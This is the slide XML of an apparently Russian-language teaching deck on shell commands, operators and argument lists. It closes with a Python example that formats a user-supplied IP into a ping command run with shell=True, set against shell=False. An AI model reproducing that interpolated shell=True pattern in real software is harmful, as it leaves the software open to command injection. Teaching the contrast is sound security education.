        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3543300" y="4476750"/>
            <a:ext cx="1123950" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="straightConnector1">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="23813">
            <a:solidFill>
              <a:srgbClr val="8D9BA5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
            <a:headEnd type="triangle" w="med" len="med"/>
          </a:ln>
        </p:spPr>
      </p:cxnSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="flow-label-preview">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{8460D82C-0DE0-41E6-A764-1D2D123FD7DD}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3600450" y="4619625"/>
            <a:ext cx="1009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Превью</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="20" name="argv">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{F326BB4B-3895-4EB8-9CE4-C45800B90499}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="685800" y="576262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8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"magick"</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="18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8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"input.png"</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="18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8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"-resize"</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="18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8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"200x200"</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="18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8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"thumb.png"</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="187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23" name="component-laptop-23">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{F38D8F23-0D11-4579-A8A3-7C43522D03A3}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1928812" y="2800350"/>
            <a:ext cx="371475" cy="278606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component-laptop-24">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{60554608-60AF-4C8B-B1EF-95E101FCFE9D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1866900" y="3078956"/>
            <a:ext cx="495300" cy="108347"/>
          </a:xfrm>
          <a:prstGeom prst="trapezoid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component-server-25">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{374AA910-E7E0-403C-A9D3-6B88A4199B65}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5848350" y="2800350"/>
            <a:ext cx="495300" cy="141514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component-server-26">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{E7EB15CC-B68A-496A-8F10-A6861B9F984D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6255203" y="2844574"/>
            <a:ext cx="35378" cy="35378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component-server-27">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{48C47EBB-174E-4E35-9D84-D89EBA4928B1}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5848350" y="2977242"/>
            <a:ext cx="495300" cy="141514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component-server-28">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{010AE264-8A77-4442-8085-993090309F69}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6255203" y="3021466"/>
            <a:ext cx="35378" cy="35378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component-server-29">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{1FA25DBE-085B-44B1-A38A-5E2B3762CB1A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5848350" y="3154135"/>
            <a:ext cx="495300" cy="141514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component-server-30">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{BA936154-4099-403E-B3FF-A05C438C10A0}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6255203" y="3198360"/>
            <a:ext cx="35378" cy="35378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component-terminal-31">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{2316AD9D-ADB8-43C9-BAD9-8D1FD1466429}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9829800" y="2800350"/>
            <a:ext cx="495300" cy="424544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component-terminal-32">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{04862E22-9851-4273-A995-FE2CD5BB4491}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9918247" y="2906485"/>
            <a:ext cx="123826" cy="176894"/>
          </a:xfrm>
          <a:prstGeom prst="chevron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2" name="Рисунок 10">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{DD222BF9-5452-48EB-B931-A8EF7A45F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2692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D735E09B-219E-4803-B6EC-B2A7A00BC59A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Shell: роль и основные команды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E45E911-19E6-40EF-96CA-971009864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3" name="lead">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{CE9FB3FD-0DA6-455B-AEF9-DEFAA31BDD40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Shell - интерпретатор командного языка. Он разбирает строку, выполняет встроенные команды и запускает программы. Примеры оболочек: sh и Bash.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D8DAEF1-94BF-44E0-87F1-1ED24020D3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9685846"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="685800" y="2638425"/>
          <a:ext cx="10820400" cy="333375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Команда</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr anchor="ctr">
                    <a:lnL w="9525">
                      <a:solidFill>
                        <a:srgbClr val="52616C"/>
                      </a:solidFill>
                      <a:prstDash val="soli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>
                      <a:solidFill>
                        <a:srgbClr val="52616C"/>
                      </a:solidFill>
                      <a:prstDash val="soli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Действие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>
                      <a:solidFill>
                        <a:srgbClr val="52616C"/>
                      </a:solidFill>
                      <a:prstDash val="soli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Аргументы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>
                      <a:solidFill>
                        <a:srgbClr val="52616C"/>
                      </a:solidFill>
                      <a:prstDash val="soli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650" b="0" dirty="0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rm </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1650" b="0" dirty="0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</a:rPr>
                        <a:t>file.txt</a:t>
                      </a:r>
                      <a:endParaRPr sz="1650" b="0" dirty="0">
                        <a:solidFill>
                          <a:srgbClr val="DCDCAA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9525">
                      <a:solidFill>
                        <a:srgbClr val="52616C"/>
                      </a:solidFill>
                      <a:prstDash val="soli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650" b="0" dirty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Удаляет файл</a:t>
                      </a:r>
                      <a:endParaRPr sz="1650" b="0" dirty="0">
                        <a:solidFill>
                          <a:srgbClr val="EEF2F6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650" b="0" dirty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Имя файла</a:t>
                      </a:r>
                      <a:endParaRPr sz="1650" b="0" dirty="0">
                        <a:solidFill>
                          <a:srgbClr val="EEF2F6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ls</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr sz="1650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-la</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr anchor="ctr">
                    <a:lnL w="9525">
                      <a:solidFill>
                        <a:srgbClr val="52616C"/>
                      </a:solidFill>
                      <a:prstDash val="soli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Показать файлы каталога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-l и -a - опции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 dirty="0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cat</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr sz="1650" b="0" dirty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650" b="0" dirty="0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</a:rPr>
                        <a:t>file.txt</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr anchor="ctr">
                    <a:lnL w="9525">
                      <a:solidFill>
                        <a:srgbClr val="52616C"/>
                      </a:solidFill>
                      <a:prstDash val="soli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Вывести содержимое файла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Имя файла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grep</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr sz="1650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650" b="0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</a:rPr>
                        <a:t>error</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr sz="1650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650" b="0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</a:rPr>
                        <a:t>file.txt</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr anchor="ctr">
                    <a:lnL w="9525">
                      <a:solidFill>
                        <a:srgbClr val="52616C"/>
                      </a:solidFill>
                      <a:prstDash val="soli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Найти строки с error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Шаблон и имя файла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 dirty="0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id</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr anchor="ctr">
                    <a:lnL w="9525">
                      <a:solidFill>
                        <a:srgbClr val="52616C"/>
                      </a:solidFill>
                      <a:prstDash val="soli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Показать UID и группы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Без аргументов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650" b="0" dirty="0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Curl</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="ru-RU" sz="1650" b="0" dirty="0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lang="en-US" sz="1650" b="0" dirty="0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https://example.com </a:t>
                      </a:r>
                      <a:endParaRPr sz="1650" b="0" dirty="0">
                        <a:solidFill>
                          <a:srgbClr val="9CDCFE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9525">
                      <a:solidFill>
                        <a:srgbClr val="52616C"/>
                      </a:solidFill>
                      <a:prstDash val="soli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650" b="0" dirty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Отправка запросов</a:t>
                      </a:r>
                      <a:endParaRPr sz="1650" b="0" dirty="0">
                        <a:solidFill>
                          <a:srgbClr val="EEF2F6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650" b="0" dirty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URL</a:t>
                      </a:r>
                      <a:endParaRPr sz="1650" b="0" dirty="0">
                        <a:solidFill>
                          <a:srgbClr val="EEF2F6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5957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D139AAE8-D908-43A7-B214-55304127D861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Команды ОС: имя и аргументы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87B68EC-D368-45EF-9A5F-152CCDDB7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4" name="shell-code">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{1FD93DF6-7989-4F94-BF71-B4CBF72B9535}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="685800" y="1504259"/>
            <a:ext cx="10820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36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>
              <a:defRPr sz="36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>
              <a:defRPr sz="36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>
              <a:defRPr sz="36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>
              <a:defRPr sz="36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>
              <a:defRPr sz="36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>
              <a:defRPr sz="36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>
              <a:defRPr sz="36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>
              <a:defRPr sz="36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>
              <a:defRPr sz="36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lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/>
              <a:defRPr sz="36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360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ls</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="360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-l </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="360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/var/log</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="part-0">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{AC035B8D-18EA-4098-9D9F-B5DC1A305ECE}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="685800" y="2561534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defPPr>
            <a:lvl1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1pPr>
            <a:lvl2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2pPr>
            <a:lvl3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3pPr>
            <a:lvl4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4pPr>
            <a:lvl5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5pPr>
            <a:lvl6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6pPr>
            <a:lvl7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7pPr>
            <a:lvl8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8pPr>
            <a:lvl9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lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/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ls</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="part-body-0">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{1B8D6373-F863-4CC6-9557-A6E18E865C41}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="685800" y="3171134"/>
            <a:ext cx="285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Имя команды: вывести список файлов.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="part-1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{7D6BEC3C-CDE3-4552-A9B0-5822B8B24BA5}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3981450" y="2561534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defPPr>
            <a:lvl1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1pPr>
            <a:lvl2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2pPr>
            <a:lvl3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3pPr>
            <a:lvl4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4pPr>
            <a:lvl5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5pPr>
            <a:lvl6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6pPr>
            <a:lvl7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7pPr>
            <a:lvl8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8pPr>
            <a:lvl9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lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/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-l</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="part-body-1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{C65F6E13-B934-44B5-B45E-F7A44F5D1A5A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3981450" y="3171134"/>
            <a:ext cx="285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Опция: подробный формат вывода.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="part-2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{54305829-D12C-4300-964B-DAE00942A523}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7277100" y="2561534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defPPr>
            <a:lvl1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1pPr>
            <a:lvl2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2pPr>
            <a:lvl3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3pPr>
            <a:lvl4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4pPr>
            <a:lvl5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5pPr>
            <a:lvl6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6pPr>
            <a:lvl7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7pPr>
            <a:lvl8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8pPr>
            <a:lvl9pPr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lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/>
              <a:defRPr sz="2250" b="1">
                <a:solidFill>
                  <a:srgbClr val="C97070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/var/log</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="part-body-2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{2AA7BA44-CB94-41C9-AB05-13B8F0D4DF29}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7277100" y="3171134"/>
            <a:ext cx="285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Аргумент: какой каталог показать.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="argv">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{2B7A4880-6545-4D93-9FB2-246852935724}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="685800" y="4447484"/>
            <a:ext cx="1024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argv = </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="210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210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"ls"</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="21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210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"-l"</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="21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210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"/var/log"</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="210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275602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15B753B-7630-4F91-B12B-E679CB236739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Shell: операторы и перенаправления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316CA8B-5CDE-4A6D-AB99-A88320192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3" name="lead">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{ABF61149-A5EC-49B2-8D59-8A5A372BA7FA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Операторы действуют по правилам shell. Перевод строки тоже может разделять команды.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42DA17BC-8814-4DD9-ACFB-662B23EAAF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0148295"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="685800" y="2276475"/>
          <a:ext cx="10820400" cy="3714753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Символ</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr anchor="ctr">
                    <a:lnL w="9525">
                      <a:solidFill>
                        <a:srgbClr val="52616C"/>
                      </a:solidFill>
                      <a:prstDash val="soli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>
                      <a:solidFill>
                        <a:srgbClr val="52616C"/>
                      </a:solidFill>
                      <a:prstDash val="soli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Смысл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>
                      <a:solidFill>
                        <a:srgbClr val="52616C"/>
                      </a:solidFill>
                      <a:prstDash val="soli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800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Пример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>
                      <a:solidFill>
                        <a:srgbClr val="52616C"/>
                      </a:solidFill>
                      <a:prstDash val="soli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;</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr anchor="ctr">
                    <a:lnL w="9525">
                      <a:solidFill>
                        <a:srgbClr val="52616C"/>
                      </a:solidFill>
                      <a:prstDash val="soli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Выполнить по очереди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printf</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr sz="1650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650" b="0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</a:rPr>
                        <a:t>'A\n'</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr sz="1650" b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;</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr sz="1650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650" b="0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printf</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr sz="1650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650" b="0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</a:rPr>
                        <a:t>'B\n'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&amp;&amp;</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr anchor="ctr">
                    <a:lnL w="9525">
                      <a:solidFill>
                        <a:srgbClr val="52616C"/>
                      </a:solidFill>
                      <a:prstDash val="soli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Только при успехе (0)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 dirty="0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test</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr sz="1650" b="0" dirty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-f </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr sz="1650" b="0" dirty="0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</a:rPr>
                        <a:t>file.txt</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr sz="1650" b="0" dirty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650" b="0" dirty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&amp;&amp;</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr sz="1650" b="0" dirty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650" b="0" dirty="0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cat</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr sz="1650" b="0" dirty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650" b="0" dirty="0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</a:rPr>
                        <a:t>file.txt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||</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr anchor="ctr">
                    <a:lnL w="9525">
                      <a:solidFill>
                        <a:srgbClr val="52616C"/>
                      </a:solidFill>
                      <a:prstDash val="soli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Только при ошибке (!= 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test</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr sz="1650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-f </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr sz="1650" b="0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</a:rPr>
                        <a:t>file.txt</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr sz="1650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650" b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||</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr sz="1650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650" b="0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printf</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr sz="1650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650" b="0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</a:rPr>
                        <a:t>'нет\n'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|</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr anchor="ctr">
                    <a:lnL w="9525">
                      <a:solidFill>
                        <a:srgbClr val="52616C"/>
                      </a:solidFill>
                      <a:prstDash val="soli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Связать stdout и stdin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650" b="0" dirty="0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Cat file.txt </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr sz="1650" b="0" dirty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|</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr sz="1650" b="0" dirty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lang="en-US" sz="1650" b="0" dirty="0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grep –</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1650" b="0" dirty="0" err="1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i</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1650" b="0" dirty="0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 “hello”</a:t>
                      </a:r>
                      <a:endParaRPr sz="1650" b="0" dirty="0">
                        <a:solidFill>
                          <a:srgbClr val="D4D4D4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&amp;</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr anchor="ctr">
                    <a:lnL w="9525">
                      <a:solidFill>
                        <a:srgbClr val="52616C"/>
                      </a:solidFill>
                      <a:prstDash val="soli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Запустить в фоне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sleep</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr sz="1650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650" b="0">
                          <a:solidFill>
                            <a:srgbClr val="B5CEA8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  <a:r>
                        <a:rPr sz="1650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650" b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&amp;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>
                          <a:solidFill>
                            <a:srgbClr val="6A9955"/>
                          </a:solidFill>
                          <a:latin typeface="Consolas"/>
                          <a:ea typeface="Consolas"/>
                          <a:cs typeface="Consolas"/>
                        </a:rPr>
                        <a:t>#</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr anchor="ctr">
                    <a:lnL w="9525">
                      <a:solidFill>
                        <a:srgbClr val="52616C"/>
                      </a:solidFill>
                      <a:prstDash val="soli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 dirty="0" err="1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Начать</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr sz="1650" b="0" dirty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комментарий</a:t>
                      </a:r>
                      <a:endParaRPr sz="1650" b="0" dirty="0">
                        <a:solidFill>
                          <a:srgbClr val="EEF2F6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50" b="0" dirty="0" err="1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printf</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr sz="1650" b="0" dirty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650" b="0" dirty="0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</a:rPr>
                        <a:t>text</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr sz="1650" b="0" dirty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650" b="0" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="6A9955"/>
                          </a:solidFill>
                          <a:latin typeface="Consolas"/>
                          <a:ea typeface="Consolas"/>
                          <a:cs typeface="Consolas"/>
                        </a:rPr>
                        <a:t># </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr sz="1650" b="0" dirty="0" err="1">
                          <a:solidFill>
                            <a:srgbClr val="6A9955"/>
                          </a:solidFill>
                          <a:latin typeface="Consolas"/>
                          <a:ea typeface="Consolas"/>
                          <a:cs typeface="Consolas"/>
                        </a:rPr>
                        <a:t>комментарий</a:t>
                      </a:r>
                      <a:endParaRPr sz="1650" b="0" dirty="0">
                        <a:solidFill>
                          <a:srgbClr val="6A9955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52616C"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                    </a:lnR>
                    <a:lnT w="9525" cap="flat" cmpd="sng" algn="ctr">
                      <a:solidFill>
                        <a:srgbClr val="5261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52616C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029502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7AD3E87B-89B6-4DBD-A300-EA1A74BB0788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Shell: строка и список аргументов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CBD542D-0A32-49B6-BDD8-0E1910B09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3" name="v17-text-66">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{0066123B-7A56-467F-973B-BF70B7352781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5067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8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shell=True: командный язык</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="v17-text-67">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{2EEF1A0E-4D44-4DAC-8806-B5A5BB4D6942}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6438900" y="1914525"/>
            <a:ext cx="5067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8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shell=False: отдельные аргументы</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="v17-text-68">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{32483FB1-91AC-4EAF-9368-83D588272DAA}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="685800" y="2695575"/>
            <a:ext cx="50673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command = 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"ping %s -c 1"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% ip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run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command, </a:t>
            </a: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shell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6" name="v17-text-69">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{54D7BDDE-A2D6-490B-A294-E6ED8AD7092F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6438900" y="2695575"/>
